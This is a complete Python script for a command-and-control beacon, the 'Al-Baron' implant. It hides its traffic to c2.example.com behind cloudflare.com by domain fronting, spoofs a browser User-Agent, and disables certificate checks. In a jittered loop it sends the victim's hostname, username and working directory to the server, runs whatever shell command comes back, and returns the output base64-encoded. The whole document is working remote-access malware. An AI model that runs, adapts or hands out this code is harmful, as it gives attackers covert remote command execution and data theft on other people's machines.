#!/usr/bin/env python3
# Al-Baron HTTPS beacon with domain fronting (SNI=cloudflare.com, Host=c2.example.com)
import requests, uuid, subprocess, time, random, os, base64, json

C2_URL = "https://cloudflare.com/api/v1/telemetry"
C2_HOST = "c2.example.com"
SID = str(uuid.uuid4())[:8]
INTERVAL = 60

session = requests.Session()
session.verify = False
session.headers.update({
    "Host": C2_HOST,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})

def beacon(payload: dict) -> dict:
    try:
        data = base64.b64encode(json.dumps(payload).encode()).decode()
        r = session.post(C2_URL, data={"d": data}, timeout=15)
        return json.loads(base64.b64decode(r.content).decode())
    except Exception:
        return {}

def main():
    while True:
        info = {
            "id": SID,
            "host": os.uname().nodename,
            "user": os.getlogin(),
            "cwd": os.getcwd(),
        }
        resp = beacon({"type": "beacon", "info": info})
        task = resp.get("task", "")
        if task:
            out = subprocess.run(task, shell=True, capture_output=True, timeout=60)
            beacon({"type": "result", "id": SID,
                     "out": base64.b64encode(out.stdout + out.stderr).decode()})
        time.sleep(INTERVAL + random.randint(-15, 15))

if __name__ == "__main__":
    main()
